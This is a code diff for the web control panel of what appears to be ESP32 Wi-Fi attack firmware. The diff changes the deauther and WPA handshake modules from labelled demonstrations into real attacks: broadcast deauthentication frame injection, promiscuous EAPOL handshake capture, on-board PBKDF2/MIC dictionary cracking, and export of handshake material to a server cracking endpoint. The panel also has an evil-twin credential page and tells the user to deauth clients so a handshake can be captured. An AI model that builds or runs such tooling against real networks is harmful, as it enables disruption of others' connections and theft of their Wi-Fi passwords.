@@ -194,7 +194,7 @@ function fragPct(free, maxBlock) { return free > 0 ? Math.max(0, (100 - 100 * ma
 const state = {
   info: null, target: null, scan: [], filter: 'all', logId: 0,
   deauthStatus: { running: false, count: 0, rate: 10, channel: 6, reason: 1 },
-  handshakeStatus: { capturing: false, m1: false, m2: false, m3: false, m4: false, pmkid: false, cracking: false, progress: 0, total: 7153, crackedPass: '' },
+  handshakeStatus: { capturing: false, m1: false, m2: false, m3: false, m4: false, pmkid: false, captured: false, unsupported: false, keyver: 0, frames: 0, cracking: false, progress: 0, total: 7153, crackedPass: '' },
   creds: []
 };
 
@@ -475,17 +475,25 @@ function renderEvilTwin() {
   loadCreds();
 }
 
-/* ---------- 4. 取消认证器 (Deauther 教学验证) ---------- */
+/* ---------- 4. 取消认证器 (Deauther 真实帧注入) ---------- */
+// 帧注入状态文案: renderDeauth 与 pollModules 共用, 保证两处一致
+function deTxModeText(d) {
+  if (d.injected === false) return '帧注入: ⚠ 目标 BSSID 格式无效, 不会发送任何帧';
+  if (typeof d.txChannel === 'undefined') return '帧注入: esp_wifi_80211_tx (Deauth 管理帧 0x00c0, 广播踢出全部客户端) — 启动后生效';
+  if (d.txErr) return `帧注入: ⚠ 最近一次 TX 失败 (错误码 ${d.txErr})`;
+  const mismatch = typeof d.txChannel === 'number' && typeof d.channel === 'number' && d.txChannel !== d.channel;
+  return `帧注入: esp_wifi_80211_tx @ ch${d.txChannel}${d.channelMoved ? '（已自动对齐目标信道，停止后恢复）' : ''}${d.txOk ? ' · 发送正常' : ' · 等待首帧'}${mismatch ? ' · ⚠ 信道对齐失败，目标可能收不到' : ''}`;
+}
 function renderDeauth() {
   const t = state.target || {};
   const de = state.deauthStatus || {};
   $('#view').innerHTML = `
   <div class="card">
     <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
-      <h3 style="margin:0">⛔ 取消认证器 (Deauther 协议机制验证)</h3>
+      <h3 style="margin:0">⛔ 取消认证器 (Deauther 真实帧注入)</h3>
       <span class="status-pill ${de.running ? 'run' : 'idle'}">${de.running ? '● 发送中' : '○ 待命'}</span>
     </div>
-    <p class="note" style="margin-bottom:14px">演示 IEEE 802.11 管理帧中 Deauthentication (0x00c0) 的明文脆弱性与防御机制 (802.11w PMF)。</p>
+    <p class="note" style="margin-bottom:14px">真实注入 IEEE 802.11 Deauthentication 管理帧 (0x00c0)，讲解其明文脆弱性与防御机制 (802.11w PMF)。单射频对齐机制：启动时热点自动切到目标所在信道（已连接的受测设备会短暂掉线、重扫后自动重连），停止后自动恢复配置信道。</p>
     <div class="frow"><label>目标 BSSID</label><input type="text" id="deBssid" value="${esc(t.bssid || 'FF:FF:FF:FF:FF:FF')}" placeholder="目标路由器 MAC 地址"></div>
     <div class="frow"><label>工作信道</label><select id="deCh" style="width:120px">${[1,2,3,4,5,6,7,8,9,10,11,12,13].map(c => `<option value="${c}" ${t.channel === c ? 'selected' : ''}>信道 ${c}</option>`).join('')}</select></div>
     <div class="frow"><label>原因代码 (Reason)</label><select id="deReason">
@@ -508,11 +516,12 @@ function renderDeauth() {
   <div class="card">
     <h3>📊 实时管理帧注入遥测</h3>
     <div class="diag">
-      <div class="dg o"><b id="deCount">${de.count || 0}</b><small>已发送管理帧</small></div>
+      <div class="dg o"><b id="deCount">${de.count || 0}</b><small>成功注入帧数</small></div>
       <div class="dg v"><b id="deRateVal">${de.rate || 10}</b><small>帧率 (fps)</small></div>
       <div class="dg y"><b id="deChVal">${de.channel || 6}</b><small>当前信道</small></div>
       <div class="dg p"><b id="deStatusVal">${de.running ? 'ACTIVE' : 'IDLE'}</b><small>引擎状态</small></div>
     </div>
+    <div class="sub" style="margin-top:10px" id="deTxMode">${deTxModeText(de)}</div>
   </div>
   ${legal()}
   <div class="logc" id="logc">[SYSTEM] 就绪。</div>`;
@@ -522,9 +531,13 @@ function renderDeauth() {
     const channel = parseInt($('#deCh').value) || 6;
     const reason = parseInt($('#deReason').value) || 1;
     const rate = parseInt($('#deRate').value) || 10;
-    await api('/api/deauth/start', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bssid, channel, reason, rate }) });
-    toast('取消认证器已启动');
-    state.deauthStatus.running = true;
+    const r = await api('/api/deauth/start', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bssid, channel, reason, rate }) });
+    let msg = '取消认证器已启动';
+    if (r.injected === false) msg += '：目标 BSSID 无效，不会发送帧';
+    else if (r.channelAligned) msg += `，热点已切至 ch${r.txChannel} 对齐目标（已连设备短暂掉线），停止后恢复`;
+    else if (r.channelMismatch) msg += `：信道对齐失败，帧仍只能在 ch${r.txChannel} 发出，目标收不到`;
+    toast(msg);
+    state.deauthStatus = Object.assign(state.deauthStatus, r, { running: true });
     renderDeauth();
   };
   $('#btnStopDe').onclick = async () => {
@@ -542,7 +555,7 @@ function updateHandshakeUI() {
   const pill = $('#hsStatusPill');
   if (pill) {
     pill.className = `status-pill ${hs.capturing ? 'run' : 'idle'}`;
-    pill.textContent = hs.capturing ? '● 正在监听' : (hs.m4 ? '✓ 完整已捕获' : '○ 待命');
+    pill.textContent = hs.capturing ? '● 正在监听' : (hs.captured ? '✓ 握手包已捕获' : '○ 待命');
   }
   const m1 = $('#hsM1'); if (m1) m1.className = `step-node ${hs.m1 ? 'active' : ''}`;
   const m2 = $('#hsM2'); if (m2) m2.className = `step-node ${hs.m2 ? 'active' : ''}`;
@@ -550,14 +563,28 @@ function updateHandshakeUI() {
   const m4 = $('#hsM4'); if (m4) m4.className = `step-node ${hs.m4 ? 'active' : ''}`;
   const pmkid = $('#hsPmkid');
   if (pmkid) pmkid.innerHTML = hs.pmkid ? '<b style="color:#35c04a">已提取 PMKID</b>' : '未提取';
+  const keyver = $('#hsKeyver');
+  if (keyver) {
+    const kv = hs.keyver || 0;
+    keyver.innerHTML = hs.captured
+      ? `<b>keyver ${kv}</b>${kv === 1 ? ' (HMAC-MD5)' : kv === 2 ? ' (HMAC-SHA1)' : ' (PMF, 板载不支持)'}`
+      : '--';
+  }
+  const frames = $('#hsFrames');
+  if (frames) frames.textContent = String(hs.frames || 0);
   const btnStart = $('#btnStartHs'); if (btnStart) btnStart.disabled = !!hs.capturing;
   const btnStop = $('#btnStopHs'); if (btnStop) btnStop.disabled = !hs.capturing;
-  const btnCrack = $('#btnCrack'); if (btnCrack) btnCrack.disabled = !!hs.cracking;
+  const btnCrack = $('#btnCrack');
+  if (btnCrack) btnCrack.disabled = !!hs.cracking || !hs.captured || !!hs.unsupported;
+  const btnDump = $('#btnDumpHs'); if (btnDump) btnDump.disabled = !hs.captured;
   const pbar = $('#hsPbar'); if (pbar) pbar.style.width = pct + '%';
   const ptext = $('#hsPtext'); if (ptext) ptext.textContent = `${hs.progress} / ${hs.total} (${pct}%)`;
   const result = $('#crackResult');
   if (result) {
-    result.innerHTML = hs.crackedPass ? `<div style="background:#b9f0ae;border:var(--bd);border-radius:10px;padding:12px;font-weight:900">🎉 破解命中! 密码凭据: <b style="font-size:18px;color:#d9534f">${esc(hs.crackedPass)}</b><br><small style="color:#333;font-weight:600">该密码属于常见弱密码字典，建议立即升级为强口令。</small></div>` : (hs.cracking ? '<span style="font-weight:800;color:#f39c12">正在高速比对字典哈希特征 …</span>' : '<span style="color:#888">点击上方按钮启动字典跑包</span>');
+    result.innerHTML = hs.crackedPass ? `<div style="background:#b9f0ae;border:var(--bd);border-radius:10px;padding:12px;font-weight:900">🎉 跑包命中! 弱口令: <b style="font-size:18px;color:#d9534f">${esc(hs.crackedPass)}</b><br><small style="color:#333;font-weight:600">该口令命中内置弱口令字典 (PBKDF2 4096 轮 + MIC 校验), 建议立即改为强口令。</small></div>`
+      : (hs.unsupported ? '<span style="font-weight:800;color:#c0392b">该网络使用 802.11w PMF (keyver 3), 板载跑包不支持 — 请点「导出握手材料」交给服务端 /api/wpa/crack 跑</span>'
+      : (hs.cracking ? '<span style="font-weight:800;color:#f39c12">正在逐条派生 PMK 并比对 MIC …</span>'
+      : (hs.captured ? '<span style="color:#888">已捕获 M1+M2, 可启动跑包</span>' : '<span style="color:#888">请先监听并抓到 M1+M2 再跑包</span>')));
   }
 }
 
@@ -567,11 +594,11 @@ function renderHandshake() {
   $('#view').innerHTML = `
   <div class="card">
     <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
-      <h3 style="margin:0">⬍ 4-Way Handshake 握手包与协议监听</h3>
-      <span class="status-pill ${hs.capturing ? 'run' : 'idle'}" id="hsStatusPill">${hs.capturing ? '● 正在监听' : (hs.m4 ? '✓ 完整已捕获' : '○ 待命')}</span>
+      <h3 style="margin:0">⬍ 4-Way Handshake 握手包捕获与跑包</h3>
+      <span class="status-pill ${hs.capturing ? 'run' : 'idle'}" id="hsStatusPill">${hs.capturing ? '● 正在监听' : (hs.captured ? '✓ 握手包已捕获' : '○ 待命')}</span>
     </div>
-    <p class="note">展示 WPA/WPA2 四次握手过程中的 ANonce/SNonce/MIC 协商过程，演示如何捕获身份验证特征并进行离线安全性校验。</p>
-    
+    <p class="note">先在「扫描」页选中目标 AP (跑包需要它的 SSID 作 PBKDF2 盐值)，再点「开始监听」。固件会把 AP 空口对齐到目标信道并打开 promiscuous 只收数据帧，从 LLC 0x888E 的 EAPOL-Key 帧里识别真实的 M1/M2/M3/M4；抓不到时用 Deauther 让客户端重连即可。</p>
+
     <div class="step-nodes">
       <div class="step-node ${hs.m1 ? 'active' : ''}" id="hsM1"><b>M1</b><small>AP ➜ STA (ANonce)</small></div>
       <div class="step-node ${hs.m2 ? 'active' : ''}" id="hsM2"><b>M2</b><small>STA ➜ AP (SNonce+MIC)</small></div>
@@ -579,48 +606,79 @@ function renderHandshake() {
       <div class="step-node ${hs.m4 ? 'active' : ''}" id="hsM4"><b>M4</b><small>STA ➜ AP (ACK完成)</small></div>
     </div>
     <div class="kv"><span class="k">PMKID 状态</span><span class="v" id="hsPmkid">${hs.pmkid ? '<b style="color:#35c04a">已提取 PMKID</b>' : '未提取'}</span></div>
+    <div class="kv"><span class="k">密钥版本</span><span class="v" id="hsKeyver">${hs.captured ? `<b>keyver ${hs.keyver || 0}</b>${hs.keyver === 1 ? ' (HMAC-MD5)' : hs.keyver === 2 ? ' (HMAC-SHA1)' : ' (PMF, 板载不支持)'}` : '--'}</span></div>
+    <div class="kv"><span class="k">已收 EAPOL-Key 帧</span><span class="v" id="hsFrames">${hs.frames || 0}</span></div>
     <div class="sub" style="margin-top:16px">
       <button class="btn green" id="btnStartHs" ${hs.capturing ? 'disabled' : ''}>⚡ 开始监听握手包</button>
       <button class="btn gray" id="btnStopHs" ${!hs.capturing ? 'disabled' : ''}>⏹ 停止监听</button>
+      <button class="btn gray" id="btnDumpHs" ${!hs.captured ? 'disabled' : ''}>⇩ 导出握手材料</button>
     </div>
   </div>
 
   <div class="card">
-    <h3>📖 本地内置弱口令字典安全审计 (7,153 条)</h3>
-    <p class="note">模拟离线跑包校验。利用常用弱密码字典进行 HMAC-SHA1 校验，演示弱口令被秒级破解的风险。</p>
+    <h3>📖 板载弱口令跑包 (内置 7,153 条)</h3>
+    <p class="note">真实离线跑包: 对每条候选口令算 PMK = PBKDF2-HMAC-SHA1(口令, SSID, 4096, 32)，再派生 PTK 并重算 M2 的 MIC (keyver 1 用 HMAC-MD5 / keyver 2 用 HMAC-SHA1)，与捕获帧的 MIC 比对，命中即该网络口令。算法与 aircrack-ng 官方向量一致。</p>
     <div class="pbar-wrap">
       <div class="pbar-fill" id="hsPbar" style="width:${pct}%"></div>
       <div class="pbar-text" id="hsPtext">${hs.progress} / ${hs.total} (${pct}%)</div>
     </div>
     <div class="frow" style="justify-content:center;margin-top:10px">
-      <button class="btn yellow" id="btnCrack" ${hs.cracking ? 'disabled' : ''}>⚡ 开始弱密码跑包校验</button>
+      <button class="btn yellow" id="btnCrack" ${hs.cracking || !hs.captured || hs.unsupported ? 'disabled' : ''}>⚡ 开始板载跑包</button>
     </div>
     <div id="crackResult" style="margin-top:14px;text-align:center">
-      ${hs.crackedPass ? `<div style="background:#b9f0ae;border:var(--bd);border-radius:10px;padding:12px;font-weight:900">🎉 破解命中! 密码凭据: <b style="font-size:18px;color:#d9534f">${esc(hs.crackedPass)}</b><br><small style="color:#333;font-weight:600">该密码属于常见弱密码字典，建议立即升级为强口令。</small></div>` : (hs.cracking ? '<span style="font-weight:800;color:#f39c12">正在高速比对字典哈希特征 …</span>' : '<span style="color:#888">点击上方按钮启动字典跑包</span>')}
+      ${hs.crackedPass ? `<div style="background:#b9f0ae;border:var(--bd);border-radius:10px;padding:12px;font-weight:900">🎉 跑包命中! 弱口令: <b style="font-size:18px;color:#d9534f">${esc(hs.crackedPass)}</b><br><small style="color:#333;font-weight:600">该口令命中内置弱口令字典 (PBKDF2 4096 轮 + MIC 校验), 建议立即改为强口令。</small></div>`
+        : (hs.unsupported ? '<span style="font-weight:800;color:#c0392b">该网络使用 802.11w PMF (keyver 3), 板载跑包不支持 — 请点「导出握手材料」交给服务端 /api/wpa/crack 跑</span>'
+        : (hs.cracking ? '<span style="font-weight:800;color:#f39c12">正在逐条派生 PMK 并比对 MIC …</span>'
+        : (hs.captured ? '<span style="color:#888">已捕获 M1+M2, 可启动跑包</span>' : '<span style="color:#888">请先监听并抓到 M1+M2 再跑包</span>')))}
     </div>
   </div>
   ${legal()}
   <div class="logc" id="logc">[SYSTEM] 就绪。</div>`;
 
   $('#btnStartHs').onclick = async () => {
-    await api('/api/handshake/start', { method: 'POST' });
-    toast('握手包监听已启动');
-    state.handshakeStatus.capturing = true;
-    updateHandshakeUI();
+    try {
+      await api('/api/handshake/start', { method: 'POST' });
+      toast('握手包监听已启动');
+      state.handshakeStatus.capturing = true;
+      updateHandshakeUI();
+    } catch (e) { toast(hsErrMsg(e)); }
   };
   $('#btnStopHs').onclick = async () => {
-    await api('/api/handshake/stop', { method: 'POST' });
-    toast('握手包监听已停止');
-    state.handshakeStatus.capturing = false;
-    state.handshakeStatus.cracking = false;
-    updateHandshakeUI();
+    try {
+      await api('/api/handshake/stop', { method: 'POST' });
+      toast('握手包监听已停止');
+      state.handshakeStatus.capturing = false;
+      state.handshakeStatus.cracking = false;
+      updateHandshakeUI();
+    } catch (e) { toast(hsErrMsg(e)); }
   };
   $('#btnCrack').onclick = async () => {
-    await api('/api/handshake/crack', { method: 'POST' });
-    toast('弱口令字典跑包已启动');
-    state.handshakeStatus.cracking = true;
-    updateHandshakeUI();
+    try {
+      await api('/api/handshake/crack', { method: 'POST' });
+      toast('板载弱口令跑包已启动');
+      state.handshakeStatus.cracking = true;
+      updateHandshakeUI();
+    } catch (e) { toast(hsErrMsg(e)); }
   };
+  $('#btnDumpHs').onclick = async () => {
+    try {
+      const d = await api('/api/handshake/dump');
+      // 材料以 JSON 形式复制到剪贴板, 直接 POST 给服务端 /api/wpa/crack
+      const text = JSON.stringify(d);
+      try {
+        await navigator.clipboard.writeText(text);
+        toast('握手材料已复制到剪贴板, 可 POST 至服务端 /api/wpa/crack');
+      } catch (err) {
+        alert(text);
+      }
+    } catch (e) { toast(hsErrMsg(e)); }
+  };
+}
+
+// 固件错误响应是 {"error":"..."} 形式, 提取可读文案
+function hsErrMsg(e) {
+  const raw = String((e && e.message) || e || '请求失败');
+  try { const j = JSON.parse(raw); return j.error || raw; } catch (_) { return raw; }
 }
 
 /* ---------- 6. 配置 ---------- */
@@ -723,6 +781,7 @@ async function pollModules() {
       state.deauthStatus = d;
       if ($('#deCount')) $('#deCount').textContent = d.count;
       if ($('#deStatusVal')) $('#deStatusVal').textContent = d.running ? 'ACTIVE' : 'IDLE';
+      if ($('#deTxMode')) $('#deTxMode').textContent = deTxModeText(d);
     }
     // 轮询 握手包 状态: 仅定向更新 DOM, 避免重构整页导致按钮与操作闪烁
     if (location.hash === '#handshake') {
